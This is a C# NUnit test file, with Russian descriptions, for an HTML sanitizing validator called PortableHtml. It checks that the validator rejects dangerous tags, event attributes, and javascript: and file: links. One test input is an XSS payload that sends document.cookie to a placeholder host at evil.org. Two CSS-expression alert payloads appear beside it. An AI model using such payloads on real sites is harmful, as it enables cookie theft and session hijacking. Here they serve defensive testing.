using System;
using System.Linq;
using System.Xml;
using System.Xml.Linq;
using NUnit.Framework;
using Qorpent.PortableHtml;
using Qorpent.Utils.Extensions;

namespace Qorpent.Serialization.Tests.PortableHtml
{
	[TestFixture(Description = "Проверка верификатора PHTML - должен учитывать все нюансы схемы PHTML")]
	public class PortableHtmlVerificationTests
	{
		private void testSchema(object srcHtml, bool isValid = true, PortableHtmlSchemaErorr error = PortableHtmlSchemaErorr.None, Type exceptionType=null, bool exactState = true){
			var result =(srcHtml is string || null==srcHtml)? PortableHtmlSchema.Validate((string)srcHtml):PortableHtmlSchema.Validate((XElement)srcHtml);
			if (isValid && !result.Ok){
				Console.WriteLine(result.SchemaError);
			}
			Assert.AreEqual(isValid,result.Ok,"Общий статус валидации неверен");
			if (error == PortableHtmlSchemaErorr.None || exactState){
				Assert.AreEqual(error, result.SchemaError, "Статус ошибки валидации неверен");
			}
			else{
				Assert.True(result.SchemaError.HasFlag(error));
			}
			if (null == exceptionType) return;
			Assert.NotNull(result.Exception,"Ожидалось исключение");
			Assert.AreEqual(exceptionType,result.Exception.GetType(),"Исключение имеет неверный тип");
			if (PortableHtmlVerificationStrategy.ForcedResult == result.Strategy){
				if (!result.Ok){
					Assert.AreEqual(1,result.Errors.Count,"Много ошибок для ForceResult");
				}
			}
			if (PortableHtmlVerificationStrategy.ForcedElementResult == result.Strategy)
			{
				if (!result.Ok){
					var groupped = result.Errors.GroupBy(_ => _.Element);
					Assert.True(groupped.All(_=>_.Count()==1),"Множественные ошибки для элемента при ForceElementResult");
				}
			}
		}

		
		[TestCase("<div></div>", true, PortableHtmlSchemaErorr.None, Description = "Требуется тег div")]
		[TestCase("<DIV></DIV>", false, PortableHtmlSchemaErorr.InvalidRootTag, Description = "Требуется тег div")]
		[TestCase("<p></p>", false, PortableHtmlSchemaErorr.InvalidRootTag, Description = "Требуется тег div")]
		[TestCase("<p></p><p></p>", false, PortableHtmlSchemaErorr.NoRootTag, Description = "Фрагменты не разрешены")]
		[TestCase("<div></div><div></div>",false,PortableHtmlSchemaErorr.NoRootTag,Description = "Фрагменты не разрешены")]
		[Test(Description = "Выполнение требования 'has_root_container'")]
		public void RootDivElementRequired(string srcHtml, bool isValid, PortableHtmlSchemaErorr error){
			testSchema(srcHtml,isValid,error);
		}

		[TestCase("<div></div>", true, PortableHtmlSchemaErorr.None, Description = "Требуется тег div")]
		[TestCase("<DIV></DIV>", false, PortableHtmlSchemaErorr.InvalidRootTag, Description = "Требуется тег div")]
		[TestCase("<p></p>", false, PortableHtmlSchemaErorr.InvalidRootTag, Description = "Требуется тег div")]
		[Test(Description = "Выполнение требования 'has_root_container'")]
		public void RootDivElementRequiredCover(string srcHtml, bool isValid, PortableHtmlSchemaErorr error)
		{
			testSchema(XElement.Parse(srcHtml), isValid, error);
		}

		[TestCase("", Description = "Требуется не пустой HTML на входе")]
		[TestCase("  ", Description = "Требуется не пустой HTML на входе")]
		[TestCase("				\r\n", Description = "Требуется не пустой HTML на входе")]
		[TestCase((string)null, Description = "Требуется не пустой HTML на входе")]
		[Test(Description = "Выполнение требования 'xml_compliant','html5_compliant'")]
		public void InvalidOnEmptyString(string srcHtml)
		{
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.EmptyInput);
		}

		[TestCase("<div active></div", Description = "Требуется валидный XML")]
		[TestCase("<!DOCTYPE html><div></div>", Description = "Требуется валидный XML (DOCTYPE рассматривается как нарушение для участка внутри документа)")]
		[TestCase("<?xml version='1' ?><div></div>", Description = "Требуется валидный XML (объявление XML рассматривается как нарушение для участка внутри документа)")]
		[TestCase("<div></div", Description = "Требуется валидный XML")]
		[Test(Description = "Выполнение требования 'xml_compliant'")]
		public void ValidXmlRequired(string srcHtml){
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.NonXml, typeof(XmlException));
		}


		[TestCase("<div><p><!--x--></p></div>", Description = "Комментарии запрещены")]
		[TestCase("<div></div><!--x-->", Description = "Комментарии запрещены")]
		[TestCase("<div><!--x--></div>", Description = "Комментарии запрещены")]
		[TestCase("<!--x--><div></div>", Description = "Комментарии запрещены")]
		[Test(Description = "Выполнение требования 'no_comments'")]
		public void CommentsAreNotAllowed(string srcHtml){
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.CommentsDetected);
		}

		[TestCase("<div><p><!--x--></p></div>", Description = "Комментарии запрещены")]
		[TestCase("<div><!--x--></div>", Description = "Комментарии запрещены")]
		[Test(Description = "Выполнение требования 'no_comments'")]
		public void CommentsAreNotAllowedCover(string srcHtml)
		{
			testSchema(XElement.Parse(srcHtml), false, PortableHtmlSchemaErorr.CommentsDetected, null,false);
		}
		
		
		[TestCase("<?some ?><div></div>", Description = "Инструкции процессинга запрещены")]
		[TestCase("<div><?some ?></div>", Description = "Инструкции процессинга запрещены")]
		[TestCase("<div></div><?some ?>", Description = "Инструкции процессинга запрещены")]
		[Test(Description = "Выполнение требования 'no_processing'")]
		public void ProcessingInstructionsAreNotAllowed(string srcHtml)
		{
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.ProcessingInstructionsDetected);
		}
		[TestCase("<div><?some ?></div>", Description = "Инструкции процессинга запрещены")]
		[Test(Description = "Выполнение требования 'no_processing'")]
		public void ProcessingInstructionsAreNotAllowedCover(string srcHtml)
		{
			testSchema(XElement.Parse(srcHtml), false, PortableHtmlSchemaErorr.ProcessingInstructionsDetected);
		}



		[TestCase("<div><P>x</P></div>", Description = "Все элементы и атрибуты должны быть в нижнем регистре")]
		[TestCase("<div><p A='1'>x</p></div>", Description = "Все элементы и атрибуты должны быть в нижнем регистре")]
		[TestCase("<div><spaN>x</spaN></div>", Description = "Все элементы и атрибуты должны быть в нижнем регистре")]
		[Test(Description = "Выполнение требования 'no_uppercase'")]
		public void UppercaseInElementsOrAttributesAreNotAllowed(string srcHtml)
		{
			testSchema(XElement.Parse(srcHtml), false, PortableHtmlSchemaErorr.UpperCaseDetected);
		}

		[TestCase("<div xmlns:x='a'></div>",  Description = "Пространства имен не поддерживаются")]
		[TestCase("<div xmlns=''></div>",  Description = "Пространства имен не поддерживаются")]
		[TestCase("<div xmlns='a'></div>", Description = "Пространства имен не поддерживаются")]
		[Test(Description = "Выполнение требования 'no_namespace'")]
		public void NamespacesAreNotAllowed(string srcHtml)
		{
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.NamespaceDeclarationDetected);
		}
		[TestCase("<![CDATA[x]]><div></div>", Description = "Блоки CDATA запрещены")]
		[TestCase("<div><![CDATA[x]]></div>", Description = "Блоки CDATA запрещены")]
		[TestCase("<div></div><![CDATA[x]]>", Description = "Блоки CDATA запрещены")]
		[Test(Description = "Выполнение требования 'no_cdata'")]
		public void CDataIsNotAllowed(string srcHtml){
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.CdataDetected);
		}

		[TestCase("script",		Description = "Запрещенный тег")]
		[TestCase("object",		Description = "Запрещенный тег")]
		[TestCase("embed",		Description = "Запрещенный тег")]
		[TestCase("iframe",		Description = "Запрещенный тег")]
		[TestCase("style",		Description = "Запрещенный тег")]
		[TestCase("form",		Description = "Запрещенный тег")]
		[TestCase("input",		Description = "Запрещенный тег")]
		[TestCase("button",		Description = "Запрещенный тег")]
		[TestCase("select",		Description = "Запрещенный тег")]
		[TestCase("applet",		Description = "Запрещенный тег")]
		[TestCase("textarea",	Description = "Запрещенный тег")]
		[Test(Description = "Выполнение требования 'deprecated_tags'")]
		public void DangerousTagsTestNotAllowed(string tagName){
			var html = "<div><" + tagName + "/></div>";
			var error = (tagName + "Detected").To<PortableHtmlSchemaErorr>();
			testSchema(html, false, error);
			html = "<div><" + tagName.ToUpper() + "/></div>";
			testSchema(html, false, error);
		}

		[TestCase("http://trusted.org/account.asp?ak=<script>document.location .replace('http://evil.org/steal.cgi?'+document.cookie);</script>",PortableHtmlSchemaErorr.NonXml)]
		[TestCase("&amp;{alert('CSS Vulnerable')};", PortableHtmlSchemaErorr.NonXml)]
		[TestCase("&{alert('CSS Vulnerable')};", PortableHtmlSchemaErorr.NonXml)]
		[Test(Description = "Включение скрипта в IMG, проверяем, что детектим опасность из http://www.technicalinfo.net/papers/CSS.html")]
		public void LocksHackedImages(string src, PortableHtmlSchemaErorr error){
			var html =
				@"<div><img src="""+src+@"""></div>";
			testSchema(html,false,PortableHtmlSchemaErorr.NonXml);
		}

		[TestCase("<div>></div>",false)]
		[TestCase("<div>&gt;</div>",true)]
		[Test(Description = "Выполнение требования 'gt_always_entity'")]
		public void NotAllowKeepNotEscapedCloseTagsInText(string srcHtml, bool result){
			Assert.Ignore("Cannot be tested well");
		}

		[TestCase("<div><p onload='xx'/></div>",Description = "Обнаружение атрибутов 'on'")]
		[TestCase("<div onload='xx'><p>x</p></div>", Description = "Обнаружение атрибутов 'on'")]
		[Test(Description = "Выполнение требования 'no_event_attributes'")]
		public void NotAllowEventAttributes(string srcHtml)
		{
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.EventAttributeDetected);
		}

		[TestCase("<div><p ng-bind='xx'/></div>", Description = "Обнаружение атрибутов 'angular'")]
		[TestCase("<div ng-controller='xx'><p>x</p></div>", Description = "Обнаружение атрибутов 'angular'")]
		[Test(Description = "Выполнение требования 'no_angular_attributes'")]
		public void NotAllowAngularAttributes(string srcHtml)
		{
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.AngularAttributeDetected);
		}


		[TestCase("style", Description = "Обнаружение атрибутов 'code'")]
		[TestCase("class", Description = "Обнаружение атрибутов 'style'")]
		[TestCase("id", Description = "Обнаружение атрибутов 'id'")]
		[Test(Description = "Выполнение требования 'no_[id,code,style]_attributes'")]
		public void NotAllowCssAttributes(string attribute){
			var srcHtml = "<div><p " + attribute + "='x'/></div>";
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.CssAttributeDetected);
			srcHtml = "<div " + attribute + "='x'></div>";
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.CssAttributeDetected);
		}

		[TestCase("name", Description = "Обнаружение атрибутов 'name'")]
		[TestCase("value", Description = "Обнаружение атрибутов 'value'")]
		[TestCase("width", Description = "Обнаружение атрибутов 'height'")]
		[TestCase("height", Description = "Обнаружение атрибутов 'width'")]
		[Test(Description = "Выполнение требования 'no_[others]_attributes'")]
		public void NotAllowedAttributes(string attribute)
		{
			var srcHtml = "<div><p " + attribute + "='x'/></div>";
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.DeprecatedAttributeDetected);
			srcHtml = "<div " + attribute + "='x'></div>";
			testSchema(srcHtml, false, PortableHtmlSchemaErorr.DeprecatedAttributeDetected);
		}

		[TestCase("<div/>",Description = "Empty")]
		[TestCase("<div></div>",Description = "Empty")]
		[TestCase("<div><p>simple</p></div>",Description = "Simple para")]
		[TestCase("<div><p phtml_id='1'>simple</p></div>",Description = "Simple para with phtml")]
		[TestCase("<div><p>simple <strong>x</strong></p></div>",Description = "Simple para with inline")]
		[Test(Description = "Проверка на прохождение валидизации нормальными примерами")]
		public void ValidCases(string srcHtml){
			testSchema(srcHtml);
		}


		[TestCase("<div><p></p></div>", false,Description = "Обнаружение атрибутов 'angular'")]
		[TestCase("<div><p>x<strong></strong></p></div>", false,Description = "Обнаружение атрибутов 'angular'")]
		[TestCase("<div><p>x<img src='x'/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
		[TestCase("<div><p><img src='x'/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
		[Test(Description = "Выполнение требования 'no_empty_elements'")]
		public void NoEmptyElementsAllowedExceptImg(string srcHtml,bool result)
		{
			testSchema(srcHtml, result, result?PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.EmptyElement);
		}

		
		[TestCase("<div><p>x<img src='x'/></p></div>", true, Description = "Закрытый пустой тег IMG")]
		[TestCase("<div><p>x<img>some</img></p></div>", false, Description = "Недопустимы заполненные IMG")]
		[Test(Description = "Выполнение требования 'no_empty_elements'")]
		public void NonEmptyImagesAreNotAllowed(string srcHtml, bool result)
		{
			testSchema(srcHtml, result, result ? PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.NonEmptyImg);
		}

		[TestCase("data",true,true,Description = "Для IMG разрешены data:")]
		[TestCase("data", false, false, Description = "Для A не разрешены data:")]
		[TestCase("javascript", false, true, Description = "Для IMG не разрешены javascript:")]
		[TestCase("javascript", false, false, Description = "Для A не разрешены javascript:")]
		[TestCase("file", false, true, Description = "Для IMG не разрешены file:")]
		[TestCase("file", false, false, Description = "Для A не разрешены file:")]
		[Test(Description = "Проверка особых схем для URL")]
		public void PreventsInvalidSchemasOnUrls(string schema,  bool result ,bool isImg){
			var error = result?PortableHtmlSchemaErorr.None: (schema + "Link").To<PortableHtmlSchemaErorr>();
			var tag = isImg ? "img" : "a";
			var attr = isImg ? "src" : "href";
			var body = isImg ? "" : "x";
			var afterColon = schema == "file" ? "///" : "";
			var html = string.Format("<div><{0} {1}='{2}:{3}x'>{4}</{0}></div>", tag, attr,schema, afterColon, body);
			testSchema(html,result,error);
		}
		[Test(Description="У всех IMG должен быть src")]
		public void NotAllowImagesWithOutSrcAttribute(){
			testSchema("<div><img/></div>",false,PortableHtmlSchemaErorr.NoRequiredSrcAttributeInImg);
		}
		[Test(Description = "У всех IMG должен быть src")]
		public void NotAllowAnchorsWithOutHrefAttribute()
		{
			testSchema("<div><a>ref</a></div>", false, PortableHtmlSchemaErorr.NoRequiredHrefAttributeInA);
		}

		[Test(Description = "Target является запрещенным атрибутом для A")]
		public void NotAllowTargetAttributeOnAnchor()
		{
			testSchema("<div><a href='x' target='_b'>ссылка</a></div>", false, PortableHtmlSchemaErorr.DeprecatedAttributeDetected);
		}
	}
}
